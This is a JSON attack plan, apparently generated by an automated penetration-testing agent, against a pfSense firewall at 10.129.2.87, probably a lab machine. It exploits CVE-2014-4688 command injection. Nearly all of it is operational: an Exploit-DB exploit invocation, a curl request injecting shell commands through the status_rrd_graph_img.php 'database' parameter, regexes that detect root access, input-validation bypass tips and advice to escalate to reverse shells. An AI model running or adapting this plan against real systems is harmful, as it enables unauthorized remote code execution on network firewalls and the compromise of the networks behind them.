{
  "plan_id": "plan_20241219_001",
  "target_ip": "10.129.2.87",
  "context_hash": "pfsense_1435_lighttpd_cve201444688",
  "attack_vectors": [
    {
      "vector_id": "vec_01",
      "priority": 1,
      "action": {
        "tool_name": "exploit_runner",
        "command_template": "python3 /usr/share/exploitdb/exploits/php/webapps/43560.py --target {target}",
        "parameters": {
          "target": "https://10.129.2.87",
          "port": 443
        },
        "timeout_seconds": 30
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "RCE",
          "mitre_id": "T1190",
          "cve_id": "CVE-2014-4688"
        },
        "hypothesis": {
          "confidence_score": 0.85,
          "rationale_tags": [
            "pfsense_1.4.35",
            "command_injection",
            "php_webshell",
            "ancient_version"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "regex_match",
          "match_pattern": "(root@|uid=0|shell|command executed)",
          "negative_pattern": "(404 Not Found|Access Denied|filter|blocked)"
        }
      },
      "rag_context": {
        "payload_snippet": "status_rrd_graph_img.php?database=queues;{command}",
        "insight": "pfSense versions < 2.1.4 vulnerable to command injection via graph parameter",
        "exploitation_logic": "URL encode special characters, use semicolon command separator, bypass input validation",
        "vulnerability_context": "affects all pfSense 1.x and 2.0.x versions, patched in 2.1.4",
        "source": "cve_2014_4688_analysis"
      }
    },
    {
      "vector_id": "vec_02",
      "priority": 2,
      "action": {
        "tool_name": "curl_request",
        "command_template": "curl -k -X GET 'https://{target}/status_rrd_graph_img.php?database=queues;{payload}' --connect-timeout 15",
        "parameters": {
          "target": "10.129.2.87",
          "payload": "id"
        },
        "timeout_seconds": 20
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "Command_Injection",
          "mitre_id": "T1059",
          "cve_id": "CVE-2014-4688"
        },
        "hypothesis": {
          "confidence_score": 0.75,
          "rationale_tags": [
            "manual_exploitation",
            "parameter_injection",
            "web_vulnerability"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "regex_match",
          "match_pattern": "(uid=|gid=|groups=)",
          "negative_pattern": "(syntax error|not found|denied)"
        }
      },
      "rag_context": {
        "payload_snippet": "database=queues;id or database=queues;uname%20-a",
        "insight": "Manual exploitation allows for payload customization and filter bypass",
        "exploitation_logic": "Test with simple commands first, then escalate to reverse shells",
        "vulnerability_context": "Requires web interface access, works over HTTP/HTTPS",
        "source": "manual_exploitation_techniques"
      }
    }
  ],
  "created_at": "2024-12-19T10:30:00Z"
}